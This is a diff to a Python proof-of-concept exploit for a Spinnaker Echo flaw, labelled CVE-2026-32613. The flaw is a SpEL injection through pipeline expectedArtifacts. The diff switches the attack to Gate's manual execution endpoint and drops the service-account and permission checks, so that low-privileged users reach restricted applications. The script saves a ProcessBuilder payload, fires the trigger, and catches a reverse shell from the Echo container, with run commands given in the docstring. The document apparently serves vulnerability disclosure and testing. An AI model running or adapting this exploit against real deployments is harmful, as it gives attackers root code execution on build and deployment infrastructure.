@@ -12,12 +12,12 @@ SUMMARY:
   Spinnaker pipelines support "expected artifacts" — declarations of
   artifacts a pipeline expects to receive from its trigger. These
   declarations are evaluated using Spring Expression Language (SpEL)
-  by the Echo service when a trigger fires. An attacker with write
-  access to any application can save a pipeline containing a malicious
-  SpEL expression in an expectedArtifact field, then fire the trigger
-  (e.g. via a webhook). Echo evaluates the expression with no
-  restrictions, giving the attacker arbitrary code execution on the
-  Echo service as the process user (typically root).
+  by the Echo service when a pipeline execution is initiated. An attacker
+  with EXECUTE (i.e. WRITE) access to any application can save a pipeline
+  containing a malicious SpEL expression in an expectedArtifact field,
+  then invoke it via Gate's manual execution endpoint. Echo evaluates the
+  expression with no restrictions, giving the attacker arbitrary code
+  execution on the Echo service as the process user (typically root).
 
 VULNERABLE CODE:
   echo/echo-pipelinetriggers/src/main/java/.../postprocessors/
@@ -31,6 +31,13 @@ VULNERABLE CODE:
   FilteredMethodResolver) that blocks this. This is the only one
   that does not.
 
+  The manual execution endpoint (POST /pipelines/v2/{app}/{pipeline}) routes
+  through Echo's ManualEventHandler, which overrides getMatchingPipelines()
+  without calling super — skipping the canAccessApplication() filter that
+  normally enforces runAsUser on automated triggers. No webhook trigger is
+  required in the pipeline definition, and no service account is needed even
+  for applications that restrict EXECUTE to specific roles.
+
 IMPACT:
   Any authenticated user with WRITE on an application can achieve Remote
   Code Execution on the Echo service JVM with full OS-level access. This
@@ -42,33 +49,32 @@ IMPACT:
 
 REPRODUCTION:
   1. Save pipeline with SpEL payload in expectedArtifacts via POST /pipelines
-  2. Fire the webhook trigger via POST /webhooks/webhook/{source}
+     (no triggers required)
+  2. Invoke via POST /pipelines/v2/{application}/{pipelineName}
   3. Echo evaluates the SpEL — spawns a reverse shell
   4. Attacker gets interactive shell on the Echo container
 
 REQUIREMENTS:
   - Gate accessible (port 8084)
   - Echo running with pipeline trigger processing enabled
-  - An application the user has WRITE access to
+  - An application the user has EXECUTE (i.e. WRITE) access to
   - Authentication credentials (one of):
     - Basic auth: --gate-user / --gate-password (LDAP or file-based)
     - Bearer token: --gate-token (OAuth2/OIDC)
     - Session cookie: --gate-cookie (any auth backend, obtain from browser)
 
 EXAMPLES:
-  # Unrestricted app — anonymous webhook trigger works:
+  # Unrestricted app:
   uv run --no-project --with requests echo_rce_via_spel.py \\
     --app testapp --gate-user devuser --gate-password devuser123
 
-  # Restricted app — needs a service account with EXECUTE:
+  # Restricted app — no service account needed:
   uv run --no-project --with requests echo_rce_via_spel.py \\
-    --app targetapp --gate-user devuser --gate-password devuser123 \\
-    --run-as-user test-svc-account@managed-service-account
+    --app targetapp --gate-user devuser --gate-password devuser123
 """
 
 import argparse
 import os
-import re
 import select
 import socket
 import sys
@@ -118,13 +124,8 @@ def main():
     parser.add_argument("--shell-host", default="host.docker.internal",
                         help="Address the Echo container uses to reach this machine "
                              "(default: host.docker.internal for Docker Desktop)")
-    parser.add_argument("--run-as-user", default=None,
-                        help="Service account to set as runAsUser on the trigger. Required when "
-                             "the target app restricts EXECUTE to specific roles, because Gate "
-                             "strips caller identity on the webhook path (triggers run as "
-                             "'anonymous'). The service account must have EXECUTE on the app.")
     parser.add_argument("--app", required=True,
-                        help="Spinnaker application the authenticated user has WRITE access to")
+                        help="Spinnaker application the authenticated user has EXECUTE access to")
     args = parser.parse_args()
 
     # Build authenticated session
@@ -143,6 +144,8 @@ def main():
     print("[*] CVE-2026-32613: SpEL RCE via expectedArtifacts in Echo")
     print(f"[*] Gate: {args.gate_url}")
     print(f"[*] Auth: {auth_method}")
+    print(f"[*] Trigger path: POST /pipelines/v2/{args.app}/<pipeline>")
+    print(f"[*] No webhook trigger required. No service account required.")
     print()
 
     # --- Step 1: Verify Gate is up ---
@@ -153,47 +156,6 @@ def main():
     except Exception as e:
         print(f"[-] Gate not accessible: {e}")
         sys.exit(1)
-
-    # --- Step 1b: Check if anonymous can EXECUTE on the target app ---
-    # Gate's webhook path (WebhookService) wraps the call to Echo in
-    # AuthenticatedRequest.allowAnonymous(), so triggers always run as
-    # 'anonymous' regardless of the caller's credentials. If the app
-    # restricts EXECUTE, we need a runAsUser on the trigger.
-    print()
-    print(f"[*] Step 1b: Checking if anonymous can trigger on '{args.app}'...")
-    run_as_user = args.run_as_user
-    try:
-        r = session.get(f"{args.gate_url}/applications/{args.app}", timeout=10)
-        if r.status_code == 200:
-            app_data = r.json()
-            # Gate nests permissions under "attributes", not at the top level
-            permissions = app_data.get("attributes", {}).get("permissions", {})
-            if not permissions:
-                permissions = app_data.get("permissions", {})
-            execute_roles = permissions.get("EXECUTE", [])
-            if execute_roles:
-                print(f"    Application '{args.app}' restricts EXECUTE to: {execute_roles}")
-                print(f"    Gate strips caller identity on webhook path (runs as 'anonymous').")
-                if run_as_user:
-                    print(f"[+] Using --run-as-user '{run_as_user}' to satisfy EXECUTE check")
-                else:
-                    print()
-                    print(f"[-] ERROR: Anonymous cannot trigger pipelines on '{args.app}'.")
-                    print(f"    Use --run-as-user with a service account that has EXECUTE permission.")
-                    print(f"    Example:")
-                    print(f"      --run-as-user test-svc-account@managed-service-account")
-                    print()
-                    print(f"    Or target an unrestricted application instead.")
-                    sys.exit(1)
-            else:
-                print(f"[+] Application '{args.app}' is unrestricted — anonymous trigger OK")
-        elif r.status_code == 404:
-            print(f"[-] Application '{args.app}' not found")
-            sys.exit(1)
-        else:
-            print(f"    Could not check app permissions (HTTP {r.status_code}), proceeding anyway")
-    except requests.RequestException as e:
-        print(f"    Could not check app permissions ({e}), proceeding anyway")
 
     # --- Step 2: Save pipeline with reverse shell SpEL payload ---
     print()
@@ -240,14 +202,7 @@ def main():
                 "usePriorArtifact": False,
             }
         ],
-        "triggers": [
-            {
-                "type": "webhook",
-                "enabled": True,
-                "source": "spel-rce-trigger",
-                **({"runAsUser": run_as_user} if run_as_user else {}),
-            }
-        ],
+        "triggers": [],
         "stages": [
             {
                 "type": "wait",
@@ -259,11 +214,10 @@ def main():
     if existing_id:
         pipeline["id"] = existing_id
 
-    print(f"    Pipeline: {pipeline_name}")
-    print(f"    SpEL payload: ${{new java.lang.ProcessBuilder(...).start()}}")
+    print(f"    Pipeline:      {pipeline_name}")
+    print(f"    SpEL payload:  ${{new java.lang.ProcessBuilder(...).start()}}")
     print(f"    Reverse shell: {args.shell_host}:{args.shell_port}")
-    if run_as_user:
-        print(f"    runAsUser: {run_as_user}")
+    print(f"    Triggers:      [] (none — not required for manual path)")
 
     r = session.post(f"{args.gate_url}/pipelines", json=pipeline, timeout=30)
     if r.status_code not in (200, 201, 202):
@@ -271,10 +225,12 @@ def main():
         sys.exit(1)
     print("[+] Pipeline saved successfully")
 
-    # --- Step 3: Start listener and fire webhook ---
+    # --- Step 3: Start listener and fire manual trigger ---
+    # ManualEventHandler falls back to querying Front50 directly if the pipeline
+    # is not yet in Echo's cache, so no full cache-refresh cycle is needed.
     print()
-    print(f"[*] Step 3: Waiting for Echo cache refresh...")
-    time.sleep(10)
+    print(f"[*] Step 3: Waiting for Front50 to persist pipeline...")
+    time.sleep(5)
     print(f"[+] Starting listener on 0.0.0.0:{args.shell_port}")
 
     try:
@@ -289,23 +245,23 @@ def main():
     srv.listen(1)
     srv.settimeout(90)
 
-    # Fire webhook in a background thread so we can accept() immediately
-    def fire_webhooks():
+    def fire_manual_trigger():
         time.sleep(1)
-        for attempt in range(6):
+        for attempt in range(5):
             try:
-                session.post(
-                    f"{args.gate_url}/webhooks/webhook/spel-rce-trigger",
-                    json={"payload": {"test": True}},
-                    timeout=10,
+                r = session.post(
+                    f"{args.gate_url}/pipelines/v2/{args.app}/{pipeline_name}",
+                    json={},
+                    timeout=15,
                 )
-            except Exception:
-                pass
+                print(f"[*] Manual trigger attempt {attempt + 1}: HTTP {r.status_code}")
+            except Exception as e:
+                print(f"[*] Manual trigger attempt {attempt + 1}: {e}")
             time.sleep(15)
 
-    webhook_thread = threading.Thread(target=fire_webhooks, daemon=True)
-    webhook_thread.start()
-    print("[*] Firing webhook triggers (will retry every 15s for cache refresh)...")
+    trigger_thread = threading.Thread(target=fire_manual_trigger, daemon=True)
+    trigger_thread.start()
+    print(f"[*] Firing manual trigger (POST /pipelines/v2/{args.app}/{pipeline_name})...")
 
     try:
         conn, addr = srv.accept()
@@ -325,6 +281,7 @@ def main():
     print()
     print("=" * 60)
     print("[+] REMOTE CODE EXECUTION CONFIRMED — Echo service")
+    print("[+] Trigger: POST /pipelines/v2 (no webhook, no service account)")
     print("=" * 60)
     print()
     print("  You now have a shell on the Echo container.")
